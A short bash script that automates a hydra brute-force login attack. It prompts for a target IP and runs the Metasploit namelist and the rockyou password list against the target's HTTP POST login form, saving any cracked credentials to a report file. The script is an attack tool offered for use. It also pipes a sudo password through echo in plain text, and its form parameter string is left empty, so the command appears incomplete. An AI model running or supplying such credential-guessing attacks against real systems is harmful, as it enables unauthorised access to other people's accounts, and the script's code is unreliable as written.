#!/bin/bash

# -L
nameList='/usr/share/wordlists/metasploit/namelist.txt';

# -P
wordList='/usr/share/wordlists/rockyou.txt';

# sudo password
read -p "Enter sudo password: " sudo_passwd;
# Target IP
read -p "Enter target IP [192.168.2.65]: " target;

# -t 
read -p "Enter thread [4-16]: " thread;

# Report path
user=$(whoami);
reportPath="/home/${user}/Desktop/Hydra-${target}.txt";

hydraAttack=$(echo ${sudo_passwd} | sudo hydra -L ${nameList} -P ${wordList} ${target} http-post-form "" -t ${thread} -vV -o ${reportPath});
if [[ ${?} -eq 0 ]];
then
    echo "Succeeded hydraAttack :D!";
    echo "Result is as below: ";
    echo "===========================";
    cat ${reportPath};
    echo "===========================";
    exit 0;
else
    echo "Failed to launch hydra attack :(";
    exit 1;
fi
exit 0
